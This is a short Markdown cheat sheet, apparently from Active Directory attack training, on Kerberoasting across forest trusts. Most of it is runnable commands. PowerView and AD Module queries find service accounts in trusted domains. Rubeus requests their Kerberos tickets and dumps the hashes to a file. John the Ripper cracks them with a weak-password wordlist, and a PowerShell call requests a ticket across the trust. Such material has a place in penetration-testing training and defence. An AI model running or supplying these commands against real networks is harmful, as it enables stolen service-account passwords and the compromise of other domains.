# Cross Domain Attacks [ Kerberoast ]
##  Methodology/Steps
> 1. First find all the SPN accounts
> 2. Request a TGS for the user who has forest trust
> 3. Crack the ticket using JTR
> 4. Using PowerShell request a TGS across trust

## PowerShell
### 1. Find user accounts used as Service account
> It is possible to execute Kerberoast across Forest trusts
```powershell
# Powerview
Get-NetUser -SPN
Get-NetUser -SPN -Verbose | select displayname,memberof
Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_SIDS'} | %{Get-DomainUser -SPN -Domain $_.TargetName}

# AD Module
Get-ADTrust -Filter 'IntraForest -ne $true' | %{Get-ADUser -Filter {ServicePrincipalName -ne "$null"} - Properties ServicePrincipalName -Server $_.Name}
```

## Binaries
### 2. Request a TGS
```powershell
C:\AD\Tools\Rubeus.exe kerberoast /user:storagesvc /simple /domain:eu.local /outfile:euhashes.txt
```

### 3. Check for the TGS
```powershell
klist
```

### 4. Crack the ticket using JTR
```powershell
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```

## PowerShell
### 5. Request TGS across trust
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList MSSQLSvc/eu-file.eu.local@eu.local
```
